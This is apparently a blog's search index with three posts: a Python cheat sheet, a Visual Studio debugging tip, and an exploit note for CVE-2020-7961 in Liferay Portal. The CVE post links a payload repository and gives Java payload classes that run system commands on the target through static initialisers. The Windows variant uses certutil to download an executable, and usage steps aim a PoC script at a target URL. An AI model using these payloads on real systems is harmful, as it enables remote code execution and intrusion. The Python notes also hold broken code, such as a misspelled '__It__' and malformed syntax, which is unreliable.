<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Python-Tips</title>
      <link href="/2020/04/16/Python-Tips/"/>
      <url>/2020/04/16/Python-Tips/</url>
      
        <content type="html"><![CDATA[<h2 id="各种运算："><a href="#各种运算：" class="headerlink" title="各种运算："></a>各种运算：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">3**2</span><br><span class="line">3^2</span><br><span class="line">2&#x2F;3 </span><br><span class="line">2.0&#x2F;3.0</span><br><span class="line">i &gt;&#x3D; j</span><br><span class="line">i &lt;&#x3D; j</span><br><span class="line">i &#x3D;&#x3D; j</span><br><span class="line">i !&#x3D; j</span><br><span class="line">a and b</span><br><span class="line">a or b</span><br><span class="line">not a</span><br><span class="line">float(a)</span><br><span class="line">int(a)</span><br><span class="line">str(d)</span><br><span class="line">ord(&quot;A&quot;) &#x3D; 65</span><br><span class="line">chr(65) &#x3D; &#39;A&#39;</span><br><span class="line">hex(100) &#x3D; &#39;0x64&#39;</span><br><span class="line">hex(100)[2:] &#x3D; &#39;64&#39;</span><br><span class="line">isinstance(1, int) &#x3D; True</span><br><span class="line">&quot;a b&quot;.split(&quot; &quot;) &#x3D; [&#39;a&#39;, &#39;b&#39;]</span><br><span class="line">&quot; &quot;.join([&#39;a&#39;, &#39;b&#39;]) &#x3D; &quot;a b&quot;</span><br><span class="line">&quot;abcdef&quot;.startswith(&quot;ab&quot;) &#x3D; True</span><br><span class="line">&quot;abcdef&quot;.contains(&quot;abc&quot;) &#x3D; True</span><br><span class="line">&quot;abc\n&quot;.strip() &#x3D; &quot;abc&quot;</span><br><span class="line">&quot;apbc&quot;.replace(&quot;p&quot;,&quot;&quot;) &#x3D; &quot;abc&quot;</span><br><span class="line">dir(str) &#x3D; List of all the availble methods</span><br><span class="line">help(str) &#x3D; Definition of the class str</span><br><span class="line">&quot;a&quot;.upper() &#x3D; &quot;A&quot;</span><br><span class="line">&quot;A&quot;.lower() &#x3D; &quot;a&quot;</span><br><span class="line">&quot;abc&quot;.capitalize() &#x3D; &quot;Abc&quot;</span><br><span class="line">sum([1,2,3]) &#x3D; 6</span><br><span class="line">sorted([1,43,5,3,21,4])</span><br></pre></td></tr></table></figure><h2 id="字符连接："><a href="#字符连接：" class="headerlink" title="字符连接："></a>字符连接：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">3 * ’a’ &#x3D; ‘aaa’</span><br><span class="line">‘a’ + ‘b’ &#x3D; ‘ab’</span><br><span class="line">‘a’ + str(3) &#x3D; ‘a3’</span><br><span class="line">[1,2,3]+[4,5]&#x3D;[1,2,3,4,5]</span><br><span class="line"></span><br><span class="line">Parts of a list</span><br><span class="line">‘abc’[0] &#x3D; ‘a’</span><br><span class="line">&#39;abc’[-1] &#x3D; ‘c’</span><br><span class="line">&#39;abc’[1:3] &#x3D; ‘bc’ from [1] to [2]</span><br><span class="line">&quot;qwertyuiop&quot;[:-1] &#x3D; &#39;qwertyuio&#39;</span><br></pre></td></tr></table></figure><h2 id="循环："><a href="#循环：" class="headerlink" title="循环："></a>循环：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if a:</span><br><span class="line">    #somethig</span><br><span class="line">elif b:</span><br><span class="line">    #something</span><br><span class="line">else:</span><br><span class="line">    #something</span><br><span class="line">​</span><br><span class="line">while(a):</span><br><span class="line">    #comething</span><br><span class="line">​</span><br><span class="line">for i in range(0,100):</span><br><span class="line">    #something from 0 to 99</span><br><span class="line">​</span><br><span class="line">for letter in &quot;hola&quot;:</span><br><span class="line">    #something with letter in &quot;hola&quot;</span><br></pre></td></tr></table></figure><h2 id="Tuples"><a href="#Tuples" class="headerlink" title="Tuples"></a>Tuples</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">t1 &#x3D; (1,&#39;2,&#39;three&#39;)</span><br><span class="line">t2 &#x3D; (5,6)</span><br><span class="line">t3 &#x3D; t1 + t2 &#x3D; (1, &#39;2&#39;, &#39;three&#39;, 5, 6)</span><br><span class="line">(4,) &#x3D; Singelton</span><br><span class="line">d &#x3D; () empty tuple</span><br><span class="line">d +&#x3D; (4,) --&gt; Adding into a tuple</span><br><span class="line">CANT! --&gt; t1[1] &#x3D;&#x3D; &#39;New value&#39;</span><br><span class="line">list(t2) &#x3D; [5,6] --&gt; From tuple to list</span><br></pre></td></tr></table></figure><h2 id="List-array"><a href="#List-array" class="headerlink" title="List (array)"></a>List (array)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">d &#x3D; [] empty</span><br><span class="line">a &#x3D; [1,2,3]</span><br><span class="line">b &#x3D; [4,5]</span><br><span class="line">a + b &#x3D; [1,2,3,4,5]</span><br><span class="line">b.append(6) &#x3D; [4,5,6]</span><br><span class="line">tuple(a) &#x3D; (1,2,3) --&gt; From list to tuple</span><br></pre></td></tr></table></figure><h2 id="Dictionary"><a href="#Dictionary" class="headerlink" title="Dictionary"></a>Dictionary</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">d &#x3D; &#123;&#125; empty</span><br><span class="line">monthNumbers&#x3D;&#123;1:’Jan’, 2: ‘feb’,’feb’:2&#125;—&gt; monthNumbers -&gt;&#123;1:’Jan’, 2: ‘feb’,’feb’:2&#125;</span><br><span class="line">monthNumbers[1] &#x3D; ‘Jan’</span><br><span class="line">monthNumbers[‘feb’] &#x3D; 2</span><br><span class="line">list(monthNumbers) &#x3D; [1,2,’feb’]</span><br><span class="line">monthNumbers.values() &#x3D; [‘Jan’,’feb’,2]</span><br><span class="line">keys &#x3D; [k for k in monthNumbers]</span><br><span class="line">a&#x3D;&#123;&#39;9&#39;:9&#125;</span><br><span class="line">monthNumbers.update(a) &#x3D; &#123;&#39;9&#39;:9, 1:’Jan’, 2: ‘feb’,’feb’:2&#125;</span><br><span class="line">mN &#x3D; monthNumbers.copy() #Independent copy</span><br><span class="line">monthNumbers.get(&#39;key&#39;,0) #Check if key exists, Return value of monthNumbers[&quot;key&quot;] or 0 if it does not exists</span><br></pre></td></tr></table></figure><h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In the sets there are not repetitions</span><br><span class="line">myset &#x3D; set([&#39;a&#39;, &#39;b&#39;]) &#x3D; &#123;&#39;a&#39;, &#39;b&#39;&#125;</span><br><span class="line">myset.add(&#39;c&#39;) &#x3D; &#123;&#39;a&#39;, &#39;b&#39;, &#39;c&#39;&#125;</span><br><span class="line">myset.add(&#39;a&#39;) &#x3D; &#123;&#39;a&#39;, &#39;b&#39;, &#39;c&#39;&#125; #No repetitions</span><br><span class="line">myset.update([1,2,3]) &#x3D; set([&#39;a&#39;, 1, 2, &#39;b&#39;, &#39;c&#39;, 3])</span><br><span class="line">myset.discard(10) #If present, remove it, if not, nothing</span><br><span class="line">myset.remove(10) #If present remove it, if not, rise exception</span><br><span class="line">myset2 &#x3D; set([1, 2, 3, 4])</span><br><span class="line">myset.union(myset2) #Values it myset OR myset2</span><br><span class="line">myset.intersection(myset2) #Values in myset AND myset2</span><br><span class="line">myset.difference(myset2) #Values in myset but not in myset2</span><br><span class="line">myset.symmetric_difference(myset2) #Values that are not in myset AND myset2 (not in both)</span><br><span class="line">myset.pop() #Get the first element of the set and remove it</span><br><span class="line">myset.intersection_update(myset2) #myset &#x3D; Elements in both myset and myset2</span><br><span class="line">myset.difference_update(myset2) #myset &#x3D; Elements in myset but not in myset2</span><br><span class="line">myset.symmetric_difference_update(myset2) #myset &#x3D; Elements that are not in both</span><br></pre></td></tr></table></figure><h2 id="Classes"><a href="#Classes" class="headerlink" title="Classes"></a>Classes</h2><p>The method in <strong>It</strong> will be the one used by sort in order to compare if an object of this class is bigger than other</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class Person(name):</span><br><span class="line">def __init__(self,name):</span><br><span class="line">self.name&#x3D; name</span><br><span class="line">self.lastName &#x3D; name.split(‘ ‘)[-1]</span><br><span class="line">self.birthday &#x3D; None</span><br><span class="line"> def __It__(self, other):</span><br><span class="line">if self.lastName &#x3D;&#x3D; other.lastName:</span><br><span class="line">return self.name &lt; other.name</span><br><span class="line">return self.lastName &lt; other.lastName #Return True if the lastname is smaller</span><br><span class="line">​</span><br><span class="line">def setBirthday(self, month, day. year):</span><br><span class="line">self.birthday &#x3D; date tame.date(year,month,day)</span><br><span class="line">def getAge(self):</span><br><span class="line">return (date time.date.today() - self.birthday).days</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line">class MITPerson(Person):</span><br><span class="line">nextIdNum &#x3D; 0# Attribute of the Class</span><br><span class="line">def __init__(self, name):</span><br><span class="line">Person.__init__(self,name)</span><br><span class="line">self.idNum &#x3D; MITPerson.nextIdNum  —&gt; Accedemos al atributo de la clase</span><br><span class="line">MITPerson.nextIdNum +&#x3D; 1 #Attribute of the class +1</span><br><span class="line">​</span><br><span class="line">def __it__(self, other):</span><br><span class="line">return self.idNum &lt; other.idNum</span><br></pre></td></tr></table></figure><h2 id="map-zip-filter-lambda-sorted-and-one-liners"><a href="#map-zip-filter-lambda-sorted-and-one-liners" class="headerlink" title="map, zip, filter, lambda, sorted and one-liners"></a>map, zip, filter, lambda, sorted and one-liners</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Map is like: [f(x) for x in iterable] --&gt; map(tutple,[a,b]) &#x3D; [(1,2,3),(4,5)]</span><br><span class="line">m &#x3D; map(lambda x: x % 3 &#x3D;&#x3D; 0, [1, 2, 3, 4, 5, 6, 7, 8, 9]) --&gt; [False, False, True, False, False, True, False, False, True]</span><br><span class="line"></span><br><span class="line">zip stops when the shorter of foo or bar stops:</span><br><span class="line"></span><br><span class="line">for f, b in zip(foo, bar):</span><br><span class="line">    print(f, b)</span><br><span class="line"></span><br><span class="line">Lambda is used to define a function</span><br><span class="line">(lambda x,y: x+y)(5,3) &#x3D; 8 --&gt; Use lambda as simple function</span><br><span class="line">sorted(range(-5,6), key&#x3D;lambda x: x** 2) &#x3D; [0, -1, 1, -2, 2, -3, 3, -4, 4, -5, 5] --&gt; Use lambda to sort a list</span><br><span class="line">m &#x3D; filter(lambda x: x % 3 &#x3D;&#x3D; 0, [1, 2, 3, 4, 5, 6, 7, 8, 9]) &#x3D; [3, 6, 9] --&gt; Use lambda to filter</span><br><span class="line">reduce (lambda x,y: x*y, [1,2,3,4]) &#x3D; 24</span><br><span class="line"></span><br><span class="line">def make_adder(n):</span><br><span class="line">return lambda x: x+n</span><br><span class="line">plus3 &#x3D; make_adder(3)</span><br><span class="line">plus3(4) &#x3D; 7 # 3 + 4 &#x3D; 7</span><br><span class="line">​</span><br><span class="line">class Car:</span><br><span class="line">crash &#x3D; lambda self: print(&#39;Boom!&#39;)</span><br><span class="line">my_car &#x3D; Car(); my_car.crash() &#x3D; &#39;Boom!&#39;</span><br><span class="line"></span><br><span class="line">mult1 &#x3D; [x for x in [1, 2, 3, 4, 5, 6, 7, 8, 9] if x%3 &#x3D;&#x3D; 0 ]</span><br><span class="line">## Exceptions</span><br><span class="line"></span><br><span class="line">def divide(x,y):</span><br><span class="line">try:</span><br><span class="line">result &#x3D; x&#x2F;y</span><br><span class="line">except ZeroDivisionError, e:</span><br><span class="line">print “division by zero!” + str(e)</span><br><span class="line">except TypeError:</span><br><span class="line">divide(int(x),int(y))</span><br><span class="line">else:</span><br><span class="line">print “result i”, result</span><br><span class="line">finally</span><br><span class="line">print “executing finally clause in any case”</span><br></pre></td></tr></table></figure><h2 id="Assert"><a href="#Assert" class="headerlink" title="Assert()"></a>Assert()</h2><p>If the condition is false the string will by printed in the screen</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def avg(grades, weights):</span><br><span class="line">assert not len(grades) &#x3D;&#x3D; 0, &#39;no grades data&#39;</span><br><span class="line">assert len(grades) &#x3D;&#x3D; &#39;wrong number grades&#39;</span><br></pre></td></tr></table></figure><h2 id="Generators-yield"><a href="#Generators-yield" class="headerlink" title="Generators, yield"></a>Generators, yield</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A generator, instead of returning something, it &quot;yields&quot; something. When you access it, it will &quot;return&quot; the first value generated, then, you can access it again and it will return the next value generated. So, all the values are not generated at the same time and a lot of memory could be saved using this instead of a list with all the values.</span><br><span class="line"></span><br><span class="line">def myGen(n):</span><br><span class="line">yield n</span><br><span class="line">yield n + 1</span><br><span class="line"></span><br><span class="line">g &#x3D; myGen(6) --&gt; 6</span><br><span class="line">next(g) --&gt; 7</span><br><span class="line">next(g) --&gt; Error</span><br></pre></td></tr></table></figure><h2 id="Regular-Expresions"><a href="#Regular-Expresions" class="headerlink" title="Regular Expresions"></a>Regular Expresions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">re.search(&quot;\w&quot;,&quot;hola&quot;).group() &#x3D; &quot;h&quot;</span><br><span class="line">re.findall(&quot;\w&quot;,&quot;hola&quot;) &#x3D; [&#39;h&#39;, &#39;o&#39;, &#39;l&#39;, &#39;a&#39;]</span><br><span class="line">re.findall(&quot;\w+(la)&quot;,&quot;hola caracola&quot;) &#x3D; [&#39;la&#39;, &#39;la&#39;]</span><br><span class="line"></span><br><span class="line">Special meanings:</span><br><span class="line">. --&gt; Everything</span><br><span class="line">\w --&gt; [a-zA-Z0-9_]</span><br><span class="line">\d --&gt; Number</span><br><span class="line">\s --&gt; WhiteSpace char[ \n\r\t\f]</span><br><span class="line">\S --&gt; Non-whitespace char</span><br><span class="line">^ --&gt; Starts with</span><br><span class="line">$ --&gt; Ends with</span><br><span class="line">+ --&gt; One or more</span><br><span class="line">* --&gt; 0 or more</span><br><span class="line">? --&gt; 0 or 1 occurrences</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">re.search(pat,str,re.IGNORECASE)</span><br><span class="line">IGNORECASE</span><br><span class="line">DOTALL --&gt; Allow dot to match newline</span><br><span class="line">MULTILINE --&gt; Allow ^ and $ to match in different lines</span><br><span class="line"></span><br><span class="line">re.findall(&quot;&lt;.*&gt;&quot;, &quot;&lt;b&gt;foo&lt;&#x2F;b&gt;and&lt;i&gt;so on&lt;&#x2F;i&gt;&quot;) &#x3D; [&#39;&lt;b&gt;foo&lt;&#x2F;b&gt;and&lt;i&gt;so on&lt;&#x2F;i&gt;&#39;]</span><br><span class="line">re.findall(&quot;&lt;.*?&gt;&quot;, &quot;&lt;b&gt;foo&lt;&#x2F;b&gt;and&lt;i&gt;so on&lt;&#x2F;i&gt;&quot;) &#x3D; [&#39;&lt;b&gt;&#39;, &#39;&lt;&#x2F;b&gt;&#39;, &#39;&lt;i&gt;&#39;, &#39;&lt;&#x2F;i&gt;&#39;]</span><br><span class="line"></span><br><span class="line">IterTools</span><br><span class="line">product</span><br><span class="line">from itertools import product --&gt; Generates combinations between 1 or more lists, perhaps repeating values, cartesian product (distributive property)</span><br><span class="line">print list(product([1,2,3],[3,4])) &#x3D; [(1, 3), (1, 4), (2, 3), (2, 4), (3, 3), (3, 4)]</span><br><span class="line">print list(product([1,2,3],repeat &#x3D; 2)) &#x3D; [(1, 1), (1, 2), (1, 3), (2, 1), (2, 2), (2, 3), (3, 1), (3, 2), (3, 3)]</span><br><span class="line"></span><br><span class="line">permutations</span><br><span class="line">from itertools import permutations --&gt; Generates combinations of all characters in every position</span><br><span class="line">print list(permutations([&#39;1&#39;,&#39;2&#39;,&#39;3&#39;])) &#x3D; [(&#39;1&#39;, &#39;2&#39;, &#39;3&#39;), (&#39;1&#39;, &#39;3&#39;, &#39;2&#39;), (&#39;2&#39;, &#39;1&#39;, &#39;3&#39;),... Every posible combination</span><br><span class="line">print(list(permutations(&#39;123&#39;,2))) &#x3D; [(&#39;1&#39;, &#39;2&#39;), (&#39;1&#39;, &#39;3&#39;), (&#39;2&#39;, &#39;1&#39;), (&#39;2&#39;, &#39;3&#39;), (&#39;3&#39;, &#39;1&#39;), (&#39;3&#39;, &#39;2&#39;)] Every posible combination of lenght 2</span><br><span class="line"></span><br><span class="line">combinations</span><br><span class="line">from itertools import combinations --&gt; Generates all possible combinations without repeating characters (if &quot;ab&quot; existing, doesn&#39;t generate &quot;ba&quot;)</span><br><span class="line">print(list(combinations(&#39;123&#39;,2))) --&gt; [(&#39;1&#39;, &#39;2&#39;), (&#39;1&#39;, &#39;3&#39;), (&#39;2&#39;, &#39;3&#39;)]</span><br><span class="line"></span><br><span class="line">combinations_with_replacement</span><br><span class="line">from itertools import combinations_with_replacement --&gt; Generates all possible combinations from the char onwards(for example, the 3rd is mixed from the 3rd onwards but not with the 2nd o first)</span><br><span class="line">print(list(combinations_with_replacement(&#39;1133&#39;,2))) &#x3D; [(&#39;1&#39;, &#39;1&#39;), (&#39;1&#39;, &#39;1&#39;), (&#39;1&#39;, &#39;3&#39;), (&#39;1&#39;, &#39;3&#39;), (&#39;1&#39;, &#39;1&#39;), (&#39;1&#39;, &#39;3&#39;), (&#39;1&#39;, &#39;3&#39;), (&#39;3&#39;, &#39;3&#39;), (&#39;3&#39;, &#39;3&#39;), (&#39;3&#39;, &#39;3&#39;)]</span><br></pre></td></tr></table></figure><h2 id="Decorators"><a href="#Decorators" class="headerlink" title="Decorators"></a>Decorators</h2><p>Decorator that size the time that a function needs to be executed (from here):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from functools import wraps</span><br><span class="line">import time</span><br><span class="line">def timeme(func):</span><br><span class="line">  @wraps(func)</span><br><span class="line">  def wrapper(*args, **kwargs):</span><br><span class="line">    print(&quot;Let&#39;s call our decorated function&quot;)</span><br><span class="line">    start &#x3D; time.time()</span><br><span class="line">    result &#x3D; func(*args, **kwargs)</span><br><span class="line">    print(&#39;Execution time: &#123;&#125; seconds&#39;.format(time.time() - start))</span><br><span class="line">    return result</span><br><span class="line">  return wrapper</span><br><span class="line">​</span><br><span class="line">@timeme</span><br><span class="line">def decorated_func():</span><br><span class="line">  print(&quot;Decorated func!&quot;)</span><br><span class="line"></span><br><span class="line">If you run it, you will see something like the following:</span><br><span class="line"></span><br><span class="line">Let&#39;s call our decorated function</span><br><span class="line">Decorated func!</span><br><span class="line">Execution time: 4.792213439941406e-05 seconds</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CPP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>编程实用指南</title>
      <link href="/2020/04/15/VisualStudio-Tips/"/>
      <url>/2020/04/15/VisualStudio-Tips/</url>
      
        <content type="html"><![CDATA[<h2 id="1、配置文件"><a href="#1、配置文件" class="headerlink" title="1、配置文件"></a>1、配置文件</h2><h3 id="1-1、调试带参数的程序："><a href="#1-1、调试带参数的程序：" class="headerlink" title="1.1、调试带参数的程序："></a>1.1、调试带参数的程序：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在vs中：右键单击project，选择properties，选择Debug,Start options下有一个框表示<span class="string">"Command Arguments"</span>。(提示：不是solution，而是project)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CPP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-7961</title>
      <link href="/2020/04/15/CVE-2020-7961/"/>
      <url>/2020/04/15/CVE-2020-7961/</url>
      
        <content type="html"><![CDATA[<h2 id="2-1、漏洞简介："><a href="#2-1、漏洞简介：" class="headerlink" title="2.1、漏洞简介："></a>2.1、漏洞简介：</h2><p>Liferay Portal是美国Liferay公司的一套基于J2EE的门户解决方案。该方案使用了EJB以及JMS等技术，并可作为Web发布和共享工作区、企业协作平台、社交网络等。<br>Liferay Portal 7.2.1 CE GA2之前版本中存在代码问题漏洞。远程攻击者可借助JSON Web服务利用该漏洞执行任意代码</p><h2 id="2-2、漏洞利用脚本："><a href="#2-2、漏洞利用脚本：" class="headerlink" title="2.2、漏洞利用脚本："></a>2.2、漏洞利用脚本：</h2><p><a href="https://github.com/Thisisfarhadzadeh/CVE-2020-7961-payloads" target="_blank" rel="noopener">https://github.com/Thisisfarhadzadeh/CVE-2020-7961-payloads</a></p><h2 id="2-4、使用说明："><a href="#2-4、使用说明：" class="headerlink" title="2.4、使用说明："></a>2.4、使用说明：</h2><p>Step 1) Write Your payload in LifExp.java<br>windows脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">public class LifExp &#123;</span><br><span class="line">static &#123;</span><br><span class="line">try &#123;</span><br><span class="line">            String[] cmd = &#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, <span class="string">"whoami"</span>&#125;;</span><br><span class="line">            Process process=java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(cmd);</span><br><span class="line">            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String s= stdInput.readLine();</span><br><span class="line">            String[] cmd2 = &#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, <span class="string">"certutil.exe -urlcache -split -f "</span>1.exe<span class="string">"&#125;;</span></span><br><span class="line"><span class="string">            java.lang.Runtime.getRuntime().exec(cmd2);</span></span><br><span class="line"><span class="string">        &#125; catch ( Exception e ) &#123;</span></span><br><span class="line"><span class="string">            e.printStackTrace();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>linux脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">public class LifExp &#123;</span><br><span class="line">static &#123;</span><br><span class="line">try &#123;</span><br><span class="line">            String[] cmd = &#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>, <span class="string">"pwd"</span>&#125;;</span><br><span class="line">            Process process=java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(cmd);</span><br><span class="line">            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String s= stdInput.readLine();</span><br><span class="line">            String[] cmd2 = &#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>, <span class="string">"telnet 127.0.0.1"</span>&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(cmd2);</span><br><span class="line">        &#125; catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Step 2) javac LifExp.java<br>Step 3) poc.py -t <a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a> </p><h3 id="2-3、漏洞利用注意事项："><a href="#2-3、漏洞利用注意事项：" class="headerlink" title="2.3、漏洞利用注意事项："></a>2.3、漏洞利用注意事项：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
